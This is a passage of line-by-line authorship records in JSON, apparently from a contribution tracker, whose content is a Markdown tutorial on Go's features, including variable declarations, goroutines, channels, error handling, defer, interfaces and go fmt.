        "content": "1. **Go is an [open source project](https://github.com/golang/go).** Learning about Go and contributing to the language may be a useful experience for those interested. In addition, its source code may be useful reading for those interested in learning good practices, or simply to find out more about how the language was implemented."
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": "Of course, Go is [not a perfect language](https://github.com/ksimka/go-is-not-good). However, for some people, Go may be exactly the right language to pick up! If you\u0027re unconvinced about how you can learn and use Go, you can use [the Go playground](https://play.golang.org/) to write, build and execute code without installing Go on your machine."
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": "As it builds on the foundations set by many popular and widely-used languages such as C, C++, Java and Python, much of Go\u0027s syntax draws from existing implementations and will be familiar to programmers looking to learn an additional language. However, Go also diverges explicitly from these other languages. Listed below are some features that make Go unique!"
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": "### Benefit: Better Variable Declarations"
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": "One immediately obvious difference between Go and other languages is that Go declares its variables in the format `var variableName (variableType)`, with the variable\u0027s type declared to the right of the variable name, as follows:"
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": "```go"
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": "var name string"
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": "name \u003d \"John Smith\""
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": "This differs from many other languages, which put the variable type to the left of the variable name."
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": "In addition, the verbosity of a declaration statement in Go can vary. You do not need to declare the `variableType` of a new variable if you use an initializer, as the type of the variable will be inferred from its initialization. For instance, in the following example, the `string` type is optional:"
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": "```go"
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": "var name string \u003d \"John Smith\""
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": "// alternatively"
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": "var name \u003d \"John Smith\""
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": "In addition to omitting the type when it can be inferred, you can also eliminate the keyword `var` when performing variable declaration by using the `:\u003d` short assignment statement. `:\u003d` acts as a shortcut to declare and immediately initialize a variable inside of a function."
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": "```go"
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": "name :\u003d \"John Smith\""
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": "Thus, we see that there are several potential ways to declare a variable in Go. Choosing which style of variable declaration to use depends on how verbose a programmer wants to be in declaring the variable. However, the upshot of having many different degrees of verbosity is that common problems of both dynamically- and statically-typed languages can be avoided. Unlikely dynamically-typed languages, in which the type of a variable is sometimes unclear, a type in Go can always be explicitly declared to increase code clarity. On the other hand, when a variable\u0027s type can be clearly inferred, programmers can choose not to be unnecessarily verbose in their code."
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "Go\u0027s syntax for more complex types such as pointers, arrays and structs is also somewhat idiosyncratic, and can be explored in this [Go blog article](https://blog.golang.org/gos-declaration-syntax), or with the help of [this tutorial on pointers](https://www.golang-book.com/books/intro/8) and [this tutorial on structs](https://www.golang-book.com/books/intro/9)."
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": "### Benefit: Better Support for Concurrency"
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": "One of Go\u0027s special features is its focus on implementing concurrency simply and well. To this end, Go\u0027s standard library comes with two features that allow for easy and maintainable concurrency."
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": "#### Goroutines"
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": "A goroutine is a lightweight thread that executes a function concurrently with its caller. A goroutine is launched by a `go` statement:"
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": "```go"
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": "func run() {"
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": "    // does something"
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": "func main() {"
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": "    go run()"
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": "    executeOtherCommands()"
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": "In the above example, using the `go` keyword launches a goroutine, which executes `run()` concurrently with `executeOtherCommands()`."
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": "Goroutines can also be started for anonymous functions:"
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": "```go"
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": "func foo() {"
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": "    go func(msg string) {"
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": "        fmt.Println(msg)"
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": "    }(\"a message\") // starts a goroutine that prints \"a message\""
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": "A goroutine is not its own thread; instead, goroutines are dynamically multiplexed onto threads as required to keep them running. In addition, goroutines start with [very small stacks](https://stackoverflow.com/questions/41906357/why-are-goroutines-much-cheaper-than-threads-in-other-languages) which makes them lightweight, so having a large number of goroutines is feasible. In practice, goroutines behave similarly to very cheap threads."
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": "#### Channels"
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": "Channels are used to fulfill Go\u0027s philosophy on concurrent software: \"don\u0027t communicate by sharing memory; share memory by communicating\". In other words, Go relies on message passing between concurrently running goroutines to share information."
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": "Specifically, Go relies on channels to implement message passing. Channels are typed conduits that allows goroutines to communicate with each other by sending and receiving messages. Before using a channel of a specific type, we must declare and `make` it:"
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": "```go"
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": "var c chan int"
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": "c \u003d make(chan int)"
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": "//alternatively"
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": "c :\u003d make(chan int)"
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "Channels can transmit data of any type; thus, creating a channel that transmits channels (i.e. a `chan chan`) is theoretically possible and may even be [useful](https://tleyden.github.io/blog/2013/11/23/understanding-chan-chans-in-go/)."
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "-"
        },
        "content": "Goroutines send and receive messages through a channel using the `\u003c-` operator."
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "-"
        },
        "content": "```go"
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "-"
        },
        "content": "ch \u003c- v   // Send v to channel ch."
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "-"
        },
        "content": "v :\u003d \u003c-ch // Receive from ch, and"
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "-"
        },
        "content": "      // assign value to v."
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "-"
        },
        "content": "One useful way to think about sending and receiving data with the `\u003c-` operator is that the data moves in the direction of the arrow."
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "-"
        },
        "content": "Channels can be used to synchronize execution across goroutines, since receivers block until they receive data, while senders block [until the receiver or buffer receives data](https://golang.org/doc/effective_go.html#channels). In the code example below, the `main` goroutine waits until it receives a message from the `worker` goroutine that it is done before terminating."
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "-"
        },
        "content": "```go"
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "-"
        },
        "content": "func worker(done chan bool) {"
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "-"
        },
        "content": "    fmt.Print(\"Working...\")"
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "-"
        },
        "content": "    time.Sleep(time.Second)"
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "-"
        },
        "content": "    fmt.Println(\"Done working\")"
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "-"
        },
        "content": "    done \u003c- true"
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "-"
        },
        "content": "func main() {"
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "-"
        },
        "content": "    done :\u003d make(chan bool)"
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "-"
        },
        "content": "    go worker(done)"
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "-"
        },
        "content": "    \u003c-done"
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "-"
        },
        "content": "    fmt.Println(\"Returned from work\")"
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 149,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 150,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 151,
        "author": {
          "gitId": "-"
        },
        "content": "If you are interested in delving deeper into using Go\u0027s concurrency features extensively, Google developers have put out video presentations on Go\u0027s [basic](https://www.youtube.com/watch?v\u003df6kdp27TYZs) and [advanced concurrency patterns](https://www.youtube.com/watch?v\u003dQDDwwePbDtw). This [code walkthrough](https://golang.org/doc/codewalk/sharemem/) provides an annotated example of how Go\u0027s memory-sharing principles can be applied in practice."
      },
      {
        "lineNumber": 152,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 153,
        "author": {
          "gitId": "-"
        },
        "content": "### Benefit: Better Error Handling"
      },
      {
        "lineNumber": 154,
        "author": {
          "gitId": "-"
        },
        "content": "Error handling in Go is performed using multiple returns. On any function that can fail, the function\u0027s last return type should always be of the type `error`. For example, the `os.Open` function returns a non-nil error value when it fails to open a file."
      },
      {
        "lineNumber": 155,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 156,
        "author": {
          "gitId": "-"
        },
        "content": "```go"
      },
      {
        "lineNumber": 157,
        "author": {
          "gitId": "-"
        },
        "content": "func Open(name string) (file *File, err error)"
      },
      {
        "lineNumber": 158,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 159,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 160,
        "author": {
          "gitId": "-"
        },
        "content": "An `error` variable represents any value that can describe itself as a string, by implementing the following interface:"
      },
      {
        "lineNumber": 161,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 162,
        "author": {
          "gitId": "-"
        },
        "content": "```go"
      },
      {
        "lineNumber": 163,
        "author": {
          "gitId": "-"
        },
        "content": "type error interface {"
      },
      {
        "lineNumber": 164,
        "author": {
          "gitId": "-"
        },
        "content": "    Error() string"
      },
      {
        "lineNumber": 165,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 166,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 167,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 168,
        "author": {
          "gitId": "-"
        },
        "content": "When calling a method that may return an error, we check if the returns `err !\u003d nil` and handle the resulting error."
      },
      {
        "lineNumber": 169,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 170,
        "author": {
          "gitId": "-"
        },
        "content": "```go"
      },
      {
        "lineNumber": 171,
        "author": {
          "gitId": "-"
        },
        "content": "func useFile() {"
      },
      {
        "lineNumber": 172,
        "author": {
          "gitId": "-"
        },
        "content": "    f, err :\u003d os.Open(\"filename.ext\")"
      },
      {
        "lineNumber": 173,
        "author": {
          "gitId": "-"
        },
        "content": "    if err !\u003d nil {"
      },
      {
        "lineNumber": 174,
        "author": {
          "gitId": "-"
        },
        "content": "        log.Fatal(err)"
      },
      {
        "lineNumber": 175,
        "author": {
          "gitId": "-"
        },
        "content": "        return"
      },
      {
        "lineNumber": 176,
        "author": {
          "gitId": "-"
        },
        "content": "    }"
      },
      {
        "lineNumber": 177,
        "author": {
          "gitId": "-"
        },
        "content": "    // do something with the open *File f"
      },
      {
        "lineNumber": 178,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 179,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 180,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 181,
        "author": {
          "gitId": "-"
        },
        "content": "Go\u0027s use of multiple returns for errors can be [contrasted with the use of exceptions in a language like Java](https://davidnix.io/post/error-handling-in-go/).  Unlike exceptions, which can crash a program, errors are seen as regular values that are to be expected by programmers and handled accordingly."
      },
      {
        "lineNumber": 182,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 183,
        "author": {
          "gitId": "-"
        },
        "content": "To deal with unexpected errors, Go also provides two mechanisms: `panic` and `recover`."
      },
      {
        "lineNumber": 184,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 185,
        "author": {
          "gitId": "-"
        },
        "content": "- `panic` is similar to throwing an exception in other languages. An explicit call to `panic` on a function `F` stops the ordinary flow of execution of `F` at the point of the panic, executes any functions deferred by `F`, and returns to `F`\u0027s caller. To the caller, `F` behaves like a call to panic. It triggers a `panic` in `F`\u0027s caller, which recursively propagates up the call stack until all functions in the goroutine have returned, after which the program crashes. `panic` is used to fail fast on errors that cannot be handled gracefully."
      },
      {
        "lineNumber": 186,
        "author": {
          "gitId": "-"
        },
        "content": "- `recover` regains control of a panicking goroutine. Using `recover` is comparable to catching an exception in C++ or Java. When used inside a deferred function, a call to recover captures the value returned by `panic` and resumes normal execution."
      },
      {
        "lineNumber": 187,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 188,
        "author": {
          "gitId": "-"
        },
        "content": "More information on error handling can be found on the [Go blog](https://blog.golang.org/error-handling-and-go) or [Go wiki](https://github.com/golang/go/wiki/PanicAndRecover)."
      },
      {
        "lineNumber": 189,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 190,
        "author": {
          "gitId": "-"
        },
        "content": "### Benefit: `defer` Execution"
      },
      {
        "lineNumber": 191,
        "author": {
          "gitId": "-"
        },
        "content": "As opposed to traditional control flow mechanisms such as `if`, `for` and `switch`, which execute functions immediately, Go\u0027s `defer` keyword pushes a function call to a list, and only executes all functions on the list after the surrounding function returns. In the following example, `defer` adds two print functions to the stack of deferred functions. After `foo` finishes executing, the deferred functions are executed in last-in-first-out order."
      },
      {
        "lineNumber": 192,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 193,
        "author": {
          "gitId": "-"
        },
        "content": "```go"
      },
      {
        "lineNumber": 194,
        "author": {
          "gitId": "-"
        },
        "content": "func foo() {"
      },
      {
        "lineNumber": 195,
        "author": {
          "gitId": "-"
        },
        "content": "    defer fmt.Println(\"This gets printed third\")"
      },
      {
        "lineNumber": 196,
        "author": {
          "gitId": "-"
        },
        "content": "    defer fmt.Println(\"This gets printed second\")"
      },
      {
        "lineNumber": 197,
        "author": {
          "gitId": "-"
        },
        "content": "    fmt.Println(\"This gets printed first\")"
      },
      {
        "lineNumber": 198,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 199,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 200,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 201,
        "author": {
          "gitId": "-"
        },
        "content": "`defer` is frequently used for clean-up actions, such as to [close files](https://gobyexample.com/defer). Deferred functions run on [panicking goroutines](#error-handling) as well, which makes them useful for recovering from `panic`."
      },
      {
        "lineNumber": 202,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 203,
        "author": {
          "gitId": "-"
        },
        "content": "### Benefit: Good Support for Interfaces"
      },
      {
        "lineNumber": 204,
        "author": {
          "gitId": "-"
        },
        "content": "Although Go has types and methods and allows pseudo-object-oriented style of programming, type hierarchy does not exist in Go. Instead, Go uses interfaces to specify methods that types should implement, favouring composition over inheritance. Types do not need to explicitly specify which interfaces are implemented. Instead, types implement interfaces by implementing the methods in the interface."
      },
      {
        "lineNumber": 205,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 206,
        "author": {
          "gitId": "-"
        },
        "content": "In the example below, the `Rectangle` type implements the interface `TwoDimensional` by implementing the methods `area()` and `perim()` that are specified in the interface. Thus, instances of `Rectangle` can be used as arguments to `price`. "
      },
      {
        "lineNumber": 207,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 208,
        "author": {
          "gitId": "-"
        },
        "content": "Meanwhile, although `Circle` implements `perim()`, it does not implement `area()`. Since it does not implement all the methods in the `TwoDimensional` interface, `Circle` does not implement `TwoDimensional`. Thus, instances of `Circle` cannot be used as arguments to `price`."
      },
      {
        "lineNumber": 209,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 210,
        "author": {
          "gitId": "-"
        },
        "content": "```go"
      },
      {
        "lineNumber": 211,
        "author": {
          "gitId": "-"
        },
        "content": "type TwoDimensional interface {"
      },
      {
        "lineNumber": 212,
        "author": {
          "gitId": "-"
        },
        "content": "    area() float64"
      },
      {
        "lineNumber": 213,
        "author": {
          "gitId": "-"
        },
        "content": "    perim() float64"
      },
      {
        "lineNumber": 214,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 215,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 216,
        "author": {
          "gitId": "-"
        },
        "content": "type Rectangle struct {"
      },
      {
        "lineNumber": 217,
        "author": {
          "gitId": "-"
        },
        "content": "    width, height float64"
      },
      {
        "lineNumber": 218,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 219,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 220,
        "author": {
          "gitId": "-"
        },
        "content": "type Circle struct {"
      },
      {
        "lineNumber": 221,
        "author": {
          "gitId": "-"
        },
        "content": "    radius float64"
      },
      {
        "lineNumber": 222,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 223,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 224,
        "author": {
          "gitId": "-"
        },
        "content": "func (r Rectangle) area() float64 {"
      },
      {
        "lineNumber": 225,
        "author": {
          "gitId": "-"
        },
        "content": "    return r.width * r.height"
      },
      {
        "lineNumber": 226,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 227,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 228,
        "author": {
          "gitId": "-"
        },
        "content": "func (r Rectangle) perim() float64 {"
      },
      {
        "lineNumber": 229,
        "author": {
          "gitId": "-"
        },
        "content": "    return r.width*2 + r.height*2"
      },
      {
        "lineNumber": 230,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 231,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 232,
        "author": {
          "gitId": "-"
        },
        "content": "func (c Circle) perim() float64 {"
      },
      {
        "lineNumber": 233,
        "author": {
          "gitId": "-"
        },
        "content": "    return 2 * math.Pi * c.radius"
      },
      {
        "lineNumber": 234,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 235,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 236,
        "author": {
          "gitId": "-"
        },
        "content": "func price(t TwoDimensional) float64 {"
      },
      {
        "lineNumber": 237,
        "author": {
          "gitId": "-"
        },
        "content": "    return t.area() * 3.5"
      },
      {
        "lineNumber": 238,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 239,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 240,
        "author": {
          "gitId": "-"
        },
        "content": "func main(){"
      },
      {
        "lineNumber": 241,
        "author": {
          "gitId": "-"
        },
        "content": "    c :\u003d Cirlce{5}"
      },
      {
        "lineNumber": 242,
        "author": {
          "gitId": "-"
        },
        "content": "    fmt.Println(price(c))"
      },
      {
        "lineNumber": 243,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 244,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 245,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 246,
        "author": {
          "gitId": "-"
        },
        "content": "Go checks that types satisfy the required interfaces at compile time. For example, the above `main` function specifies that `Circle` satisfies the `TwoDimensional` interface, when in actuality it does not. Thus, when you try to compile your program, you will get a compile-time error drawing your attention to the problem."
      },
      {
        "lineNumber": 247,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 248,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 249,
        "author": {
          "gitId": "-"
        },
        "content": "cannot use c (type Circle) as type TwoDimensional in argument to price:"
      },
      {
        "lineNumber": 250,
        "author": {
          "gitId": "-"
        },
        "content": "    Circle does not implement TwoDimensional (missing area method)"
      },
      {
        "lineNumber": 251,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 252,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 253,
        "author": {
          "gitId": "-"
        },
        "content": "One benefit of using a system where interface implementations need not be stated in the source code is that methods can be attached to types that you didn\u0027t write. In other words, you can extend a type to implement an interface without access to its source code by simply implementing the interface\u0027s method in your own code."
      },
      {
        "lineNumber": 254,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 255,
        "author": {
          "gitId": "-"
        },
        "content": "Some resources to get started with Go interfaces include [this blog post](https://medium.com/golangspec/interfaces-in-go-part-i-4ae53a97479c) introducing Go interfaces and code examples on"
      },
      {
        "lineNumber": 256,
        "author": {
          "gitId": "-"
        },
        "content": "[how interfaces (including the empty interface) are used in practice](https://www.calhoun.io/how-do-interfaces-work-in-go/). For a more extensive look at how object-oriented programming is done in Go, you can refer to this [comparison of Go\u0027s OOP style with that of other languages](https://flaviocopes.com/golang-is-go-object-oriented/), [Go\u0027s official FAQ on OOP](https://golang.org/doc/faq#Is_Go_an_object-oriented_language), or this [tutorial on OOP in Go](https://code.tutsplus.com/tutorials/lets-go-object-oriented-programming-in-golang--cms-26540)."
      },
      {
        "lineNumber": 257,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 258,
        "author": {
          "gitId": "-"
        },
        "content": "### Benefit: Canonical Coding Style"
      },
      {
        "lineNumber": 259,
        "author": {
          "gitId": "-"
        },
        "content": "Formatting in Go is enforced by running `go fmt`, which will align your source code with the language-wide standard style of indentation and vertical alignment. Thus, given the following code:"
      },
      {
        "lineNumber": 260,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 261,
        "author": {
          "gitId": "-"
        },
        "content": "```go"
      },
      {
        "lineNumber": 262,
        "author": {
          "gitId": "-"
        },
        "content": "type T struct {"
      },
      {
        "lineNumber": 263,
        "author": {
          "gitId": "-"
        },
        "content": "    name string // name of the object"
      },
      {
        "lineNumber": 264,
        "author": {
          "gitId": "-"
        },
        "content": "    value int // its value"
      },
      {
        "lineNumber": 265,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 266,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 267,
        "author": {
          "gitId": "-"
        },
        "content": "Running `$ go fmt` in the same directory as the source file will line up comments and correct the source code\u0027s indentation:"
      },
      {
        "lineNumber": 268,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 269,
        "author": {
          "gitId": "-"
        },
        "content": "```go"
      },
      {
        "lineNumber": 270,
        "author": {
          "gitId": "-"
        },
        "content": "type T struct {"
      },
      {
        "lineNumber": 271,
        "author": {
          "gitId": "-"
        },
        "content": "    name  string // name of the object"
      },
      {
        "lineNumber": 272,
        "author": {
          "gitId": "-"
        },
        "content": "    value int    // its value"
      },
      {
        "lineNumber": 273,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 274,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 275,
        "author": {
          "gitId": "-"
        },
        "content": "Variations on `go fmt` may be of use, and can be found in the [Go documentation](https://golang.org/cmd/gofmt/)."
      },
      {
        "lineNumber": 276,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 277,
        "author": {
          "gitId": "-"
        },
        "content": "Go also enforces good coding practices, for instance, by refusing to build projects that declare of unused variables or imports. Such enforcement, along with a clear, unified and extensive [treatise on coding conventions in Go](https://golang.org/doc/effective_go.html), have manifested in a reasonably stable Go coding style."
      },
      {
